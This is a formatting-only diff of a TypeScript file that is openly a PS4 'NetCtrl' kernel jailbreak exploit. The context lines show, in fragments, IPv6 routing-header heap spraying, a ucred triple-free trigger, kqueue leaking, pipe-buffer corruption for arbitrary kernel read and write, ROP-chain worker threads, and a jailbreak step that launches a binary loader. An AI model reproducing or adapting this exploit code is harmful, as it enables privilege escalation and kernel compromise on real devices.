@@ -3,8 +3,8 @@ import { libc_addr } from 'download0/userland'
 import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
 import { show_success, run_binloader } from 'download0/loader'
 
-let _log: (msg: string, screen: boolean) => void;
-declare var ws: { broadcast: (msg: string) => void };
+let _log: (msg: string, screen: boolean) => void
+declare var ws: { broadcast: (msg: string) => void }
 
 // include('userland.js')
 
@@ -14,7 +14,7 @@ if (typeof libc_addr === 'undefined') {
 include('kernel.js')
 include('binloader.js')
 if (!String.prototype.padStart) {
-  String.prototype.padStart = function padStart(targetLength, padString) {
+  String.prototype.padStart = function padStart (targetLength, padString) {
     targetLength = targetLength >> 0 // truncate if number or convert non-number to 0
     padString = String(typeof padString !== 'undefined' ? padString : ' ')
     if (this.length > targetLength) {
@@ -256,7 +256,7 @@ const tmp = malloc(PAGE_SIZE)
 let saved_fpu_ctrl = 0
 let saved_mxcsr = 0
 
-function build_rthdr(buf: BigInt, size: number) {
+function build_rthdr (buf: BigInt, size: number) {
   const len = ((size >> 3) - 1) & ~1
   const actual_size = (len + 1) << 3
   write8(buf.add(0x00), 0)                   // ip6r_nxt
@@ -266,7 +266,7 @@ function build_rthdr(buf: BigInt, size: number) {
   return actual_size
 }
 
-function set_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
+function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
   const result = setsockopt(sd, level, optname, optval, optlen)
   if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
     throw new Error('set_sockopt error: ' + hex(result))
@@ -287,7 +287,7 @@ const spawn_thr_args = malloc(0x80)
 const spawn_tid = malloc(0x8)
 const spawn_cpid = malloc(0x8)
 
-function get_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
+function get_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
   // const len_ptr = malloc(4);
   write32(sockopt_len_ptr, optlen)
   const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr)
@@ -299,21 +299,21 @@ function get_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt,
   return read32(sockopt_len_ptr)
 }
 
-function set_rthdr(sd: BigInt, buf: BigInt, len: number) {
+function set_rthdr (sd: BigInt, buf: BigInt, len: number) {
   return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
   // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
   // return ret;
 }
 
-function get_rthdr(sd: BigInt, buf: BigInt, max_len: number) {
+function get_rthdr (sd: BigInt, buf: BigInt, max_len: number) {
   return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len)
   // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
   // return ret;
 }
 
-function free_rthdrs(sds: BigInt[]) {
+function free_rthdrs (sds: BigInt[]) {
   for (const sd of sds) {
     if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
       set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
@@ -321,16 +321,16 @@ function free_rthdrs(sds: BigInt[]) {
   }
 }
 
-function free_rthdr(sd: BigInt) {
+function free_rthdr (sd: BigInt) {
   set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
 }
 
-function pin_to_core(core: number) {
+function pin_to_core (core: number) {
   write32(cpu_mask_buf, 1 << core)
   cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
 }
 
-function get_core_index(mask_addr: BigInt) {
+function get_core_index (mask_addr: BigInt) {
   let num = Number(read32(mask_addr))
   let position = 0
   while (num > 0) {
@@ -340,25 +340,25 @@ function get_core_index(mask_addr: BigInt) {
   return position - 1
 }
 
-function get_current_core() {
+function get_current_core () {
   cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
   return get_core_index(cpu_mask_buf)
 }
 
-function set_rtprio(prio: number) {
+function set_rtprio (prio: number) {
   write16(rtprio_scratch, PRI_REALTIME)
   write16(rtprio_scratch.add(2), prio)
   rtprio_thread(RTP_SET, 0, rtprio_scratch)
 }
 
-function get_rtprio() {
+function get_rtprio () {
   write16(rtprio_scratch, PRI_REALTIME)
   write16(rtprio_scratch.add(2), 0)
   rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch)
   return Number(read16(rtprio_scratch.add(2)))
 }
 
-function create_workers() {
+function create_workers () {
   const sock_buf = malloc(8)
 
   // Create workers
@@ -462,7 +462,7 @@ function create_workers() {
   spray_ipv6_worker = worker         // --> Worker data
 }
 
-function init_workers() {
+function init_workers () {
   init_threading() // save needed info for longjmp
 
   let worker
@@ -499,19 +499,19 @@ function init_workers() {
   }
 }
 
-function nanosleep_fun(nsec: number) {
+function nanosleep_fun (nsec: number) {
   write64(nanosleep_timespec, Math.floor(nsec / 1e9))    // tv_sec
   write64(nanosleep_timespec.add(8), nsec % 1e9)         // tv_nsec
   nanosleep(nanosleep_timespec)
 }
 
-function wait_for(addr: BigInt, threshold: number) {
+function wait_for (addr: BigInt, threshold: number) {
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(1)
   }
 }
 
-function trigger_iov_recvmsg() {
+function trigger_iov_recvmsg () {
   let worker: Worker
   // Clear done signals
   for (let i = 0; i < IOV_THREAD_NUM; i++) {
@@ -530,7 +530,7 @@ function trigger_iov_recvmsg() {
   }
 }
 
-function wait_iov_recvmsg() {
+function wait_iov_recvmsg () {
   let worker: Worker
   // Wait for completition
   for (let i = 0; i < IOV_THREAD_NUM; i++) {
@@ -542,7 +542,7 @@ function wait_iov_recvmsg() {
   // debug("iov_recvmsg workers run OK");
 }
 
-function trigger_ipv6_spray_and_read() {
+function trigger_ipv6_spray_and_read () {
   // Worker information is already loaded
 
   // Clear done signals
@@ -564,12 +564,12 @@ function trigger_ipv6_spray_and_read() {
   }
 }
 
-function wait_ipv6_spray_and_read() {
+function wait_ipv6_spray_and_read () {
   // Wait for completition
   wait_for(spray_ipv6_worker.done, 1)
 }
 
-function trigger_uio_readv() {
+function trigger_uio_readv () {
   let worker: Worker
   // Clear done signals
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -588,7 +588,7 @@ function trigger_uio_readv() {
   }
 }
 
-function wait_uio_readv() {
+function wait_uio_readv () {
   let worker: Worker
   // Wait for completition
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -598,7 +598,7 @@ function wait_uio_readv() {
   // debug("Exit wait_uio_readv()");
 }
 
-function trigger_uio_writev() {
+function trigger_uio_writev () {
   let worker: Worker
   // Clear done signals
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -617,7 +617,7 @@ function trigger_uio_writev() {
   }
 }
 
-function wait_uio_writev() {
+function wait_uio_writev () {
   let worker: Worker
   // Wait for completition
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -627,7 +627,7 @@ function wait_uio_writev() {
   // debug("Exit wait_uio_writev()");
 }
 
-function init() {
+function init () {
   log('=== PS4 NetCtrl Jailbreak ===')
   log('build: %VERSION_STRING%')
   log('tag: %VERSION_TAG%')
@@ -667,7 +667,7 @@ let prev_core: number = -1
 let prev_rtprio: number = -1
 let cleanup_called: boolean = false
 
-function setup() {
+function setup () {
   debug('Preparing netctrl...')
 
   prev_core = get_current_core()
@@ -742,7 +742,7 @@ function setup() {
   debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
 }
 
-function cleanup(kill_workers = false) {
+function cleanup (kill_workers = false) {
   if (cleanup_called) return
   cleanup_called = true
   debug('Cleaning up...')
@@ -816,13 +816,13 @@ function cleanup(kill_workers = false) {
   debug('Cleanup completed')
 }
 
-function fill_buffer_64(buf: BigInt, val: BigInt, len: number) {
+function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
   for (let i = 0; i < len; i = i + 8) {
     write64(buf.add(i), val)
   }
 }
 
-function find_twins() {
+function find_twins () {
   let count = 0
   let val
   let i
@@ -875,7 +875,7 @@ function find_twins() {
   // throw new Error("find_twins failed");
 }
 
-function find_triplet(master: number, other: number, iterations?: number) {
+function find_triplet (master: number, other: number, iterations?: number) {
   // debug("Enter find_triplet (" + master + ") (" + other + ")" );
 
   if (typeof iterations === 'undefined') {
@@ -927,7 +927,7 @@ function find_triplet(master: number, other: number, iterations?: number) {
   // throw new Error("find_triplet failed");
 }
 
-function init_threading() {
+function init_threading () {
   const jmpbuf = malloc(0x60)
   setjmp(jmpbuf)
   saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)))
@@ -940,7 +940,7 @@ const LOG_COLORS = [
   '#4DABF7', '#9775FA', '#DA77F2'
 ]
 
-function setup_log_screen() {
+function setup_log_screen () {
   jsmaf.root.children.length = 0
 
   const bg = new Image({
@@ -982,7 +982,7 @@ function setup_log_screen() {
   }
 }
 
-function yield_to_render(callback: () => void) {
+function yield_to_render (callback: () => void) {
   const id = jsmaf.setInterval(function () {
     jsmaf.clearInterval(id)
     try {
@@ -997,7 +997,7 @@ function yield_to_render(callback: () => void) {
 let exploit_count = 0
 let exploit_end = false
 
-function netctrl_exploit() {
+function netctrl_exploit () {
   setup_log_screen()
 
   const supported_fw = init()
@@ -1009,7 +1009,7 @@ function netctrl_exploit() {
   yield_to_render(exploit_phase_setup)
 }
 
-function exploit_phase_setup() {
+function exploit_phase_setup () {
   setup()
   log('Workers spawned')
   exploit_count = 0
@@ -1017,7 +1017,7 @@ function exploit_phase_setup() {
   yield_to_render(exploit_phase_trigger)
 }
 
-function exploit_phase_trigger() {
+function exploit_phase_trigger () {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W')
     cleanup()
@@ -1036,7 +1036,7 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak)
 }
 
-function exploit_phase_leak() {
+function exploit_phase_leak () {
   if (!leak_kqueue()) {
     yield_to_render(exploit_phase_trigger)
     return
@@ -1046,17 +1046,17 @@ function exploit_phase_leak() {
   yield_to_render(exploit_phase_rw)
 }
 
-function exploit_phase_rw() {
+function exploit_phase_rw () {
   setup_arbitrary_rw()
   log('Jailbreaking...')
   yield_to_render(exploit_phase_jailbreak)
 }
 
-function exploit_phase_jailbreak() {
+function exploit_phase_jailbreak () {
   jailbreak()
 }
 
-function setup_arbitrary_rw() {
+function setup_arbitrary_rw () {
   // Leak fd_files from kq_fdp.
   const fd_files = kreadslow64(kq_fdp)
   fdt_ofiles = fd_files.add(0x00)
@@ -1131,7 +1131,7 @@ function setup_arbitrary_rw() {
   debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
 }
 
-function find_allproc() {
+function find_allproc () {
   // Use existing master_pipe instead of creating new one
   const pipe_0 = master_pipe[0]
   const pipe_1 = master_pipe[1]
@@ -1180,7 +1180,7 @@ function find_allproc() {
   return p
 }
 
-function jailbreak() {
+function jailbreak () {
   debug('jailbreak - Starting...')
   if (!kernel_offset) {
     throw new Error('Kernel offsets not loaded')
@@ -1210,17 +1210,17 @@ function jailbreak() {
   run_binloader()
 }
 
-function fhold(fp: BigInt) {
+function fhold (fp: BigInt) {
   kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1) // f_count
 }
 
-function fget(fd: number) {
+function fget (fd: number) {
   var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
   debug('Returning fget: ' + hex(f) + ' for fd: ' + fd)
   return f
 }
 
-function remove_rthr_from_socket(fd: number) {
+function remove_rthr_from_socket (fd: number) {
   // In case last triplet was not found in kwriteslow
   // At this point we don't care about twins/triplets
   if (fd > 0) {
@@ -1238,7 +1238,7 @@ function remove_rthr_from_socket(fd: number) {
 
 const victim_pipe_buf = malloc(PIPEBUF_SIZE)
 
-function corrupt_pipe_buf(cnt: number, _in: number, out: number, size: number, buffer: BigInt) {
+function corrupt_pipe_buf (cnt: number, _in: number, out: number, size: number, buffer: BigInt) {
   if (buffer.eq(0)) {
     throw new Error('buffer cannot be zero')
   }
@@ -1261,12 +1261,12 @@ function corrupt_pipe_buf(cnt: number, _in: number, out: number, size: number, b
   return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE)
 }
 
-function kwrite(dest: BigInt, src: BigInt, n: number) {
+function kwrite (dest: BigInt, src: BigInt, n: number) {
   corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest)
   return write(new BigInt(victimWpipeFd), src, n)
 }
 
-function kread(dest: BigInt, src: BigInt, n: number) {
+function kread (dest: BigInt, src: BigInt, n: number) {
   debug('Enter kread for src: ' + hex(src))
   corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src)
   // Debug
@@ -1277,27 +1277,27 @@ function kread(dest: BigInt, src: BigInt, n: number) {
   // }
 }
 
-function kwrite64(addr: BigInt, val: BigInt) {
+function kwrite64 (addr: BigInt, val: BigInt) {
   write64(tmp, val)
   kwrite(addr, tmp, 8)
 }
 
-function kwrite32(addr: BigInt, val: number) {
+function kwrite32 (addr: BigInt, val: number) {
   write32(tmp, val)
   kwrite(addr, tmp, 4)
 }
 
-function kread64(addr: BigInt) {
+function kread64 (addr: BigInt) {
   kread(tmp, addr, 8)
   return read64(tmp)
 }
 
-function kread32(addr: BigInt) {
+function kread32 (addr: BigInt) {
   kread(tmp, addr, 4)
   return read32(tmp)
 }
 
-function read_buffer(addr: BigInt, len: number) {
+function read_buffer (addr: BigInt, len: number) {
   const buffer = new Uint8Array(len)
   for (let i = 0; i < len; i++) {
     buffer[i] = Number(read8(addr.add(i)))
@@ -1305,7 +1305,7 @@ function read_buffer(addr: BigInt, len: number) {
   return buffer
 }
 
-function write_buffer(addr: BigInt, buffer: Uint8Array) {
+function write_buffer (addr: BigInt, buffer: Uint8Array) {
   for (let i = 0; i < buffer.length; i++) {
     write8(addr.add(i), buffer[i]!)
   }
@@ -1323,7 +1323,7 @@ kernel.write_buffer = function (kaddr, buf) {
   kwrite(kaddr, tmp, buf.length)
 }
 
-function remove_uaf_file() {
+function remove_uaf_file () {
   if (uaf_socket === undefined) {
     throw new Error('uaf_socket is undefined')
   }
@@ -1343,7 +1343,7 @@ function remove_uaf_file() {
   }
 }
 
-function trigger_ucred_triplefree() {
+function trigger_ucred_triplefree () {
   let end = false
 
   write64(msgIov.add(0x0), 1) // iov_base
@@ -1488,7 +1488,7 @@ function trigger_ucred_triplefree() {
   return true
 }
 
-function leak_kqueue() {
+function leak_kqueue () {
   // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Leaking kqueue...')
 
@@ -1548,7 +1548,7 @@ function leak_kqueue() {
   return true
 }
 
-function kreadslow64(address: BigInt) {
+function kreadslow64 (address: BigInt) {
   const buffer = kreadslow(address, 8)
   // debug("Buffer from kreadslow: " + hex(buffer));
   if (buffer.eq(BigInt_Error)) {
@@ -1558,7 +1558,7 @@ function kreadslow64(address: BigInt) {
   return read64(buffer)
 }
 
-function build_uio(uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, addr: BigInt, size: number) {
+function build_uio (uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, addr: BigInt, size: number) {
   write64(uio.add(0x00), uio_iov)        // uio_iov
   write64(uio.add(0x08), UIO_IOV_NUM)    // uio_iovcnt
   write64(uio.add(0x10), BigInt_Error)   // uio_offset
@@ -1570,7 +1570,7 @@ function build_uio(uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, 
   write64(uio.add(0x38), size)           // iov_len
 }
 
-function kreadslow(addr: BigInt, size: number) {
+function kreadslow (addr: BigInt, size: number) {
   // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
 
@@ -1780,7 +1780,7 @@ function kreadslow(addr: BigInt, size: number) {
   return leak_buffer
 }
 
-function kwriteslow(addr: BigInt, buffer: BigInt, size: number) {
+function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
 
@@ -1907,7 +1907,7 @@ function kwriteslow(addr: BigInt, buffer: BigInt, size: number) {
   return new BigInt(0)
 }
 
-function rop_regen_and_loop(last_rop_entry: BigInt, number_entries: number) {
+function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
   let new_rop_entry = last_rop_entry.add(8)
   let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)   // We add 8 to have the first ROP instruction add
   const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)     // We add 8 to have the first ROP instruction add
@@ -1931,7 +1931,7 @@ function rop_regen_and_loop(last_rop_entry: BigInt, number_entries: number) {
   write64(new_rop_entry.add(0x8), rop_loop)
 }
 
-function spawn_thread(rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt) {
+function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt) {
   const rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600)
 
   // const rop_addr = malloc(size); // ROP Stack plus extra size
@@ -1982,7 +1982,7 @@ function spawn_thread(rop_array: BigInt[], loop_entries: number, predefinedStack
   return read64(spawn_tid)
 }
 
-function iov_recvmsg_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+function iov_recvmsg_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
   const rop: BigInt[] = []
 
   rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
@@ -2060,7 +2060,7 @@ function iov_recvmsg_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signa
   }
 }
 
-function uio_readv_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+function uio_readv_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
   const rop: BigInt[] = []
 
   rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
@@ -2138,7 +2138,7 @@ function uio_readv_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signal:
   }
 }
 
-function uio_writev_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+function uio_writev_worker_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
   const rop: BigInt[] = []
 
   rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
@@ -2216,7 +2216,7 @@ function uio_writev_worker_rop(ready_signal: BigInt, run_fd: BigInt, done_signal
   }
 }
 
-function ipv6_sock_spray_and_read_rop(ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
+function ipv6_sock_spray_and_read_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
   const rop: BigInt[] = []
 
   rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it
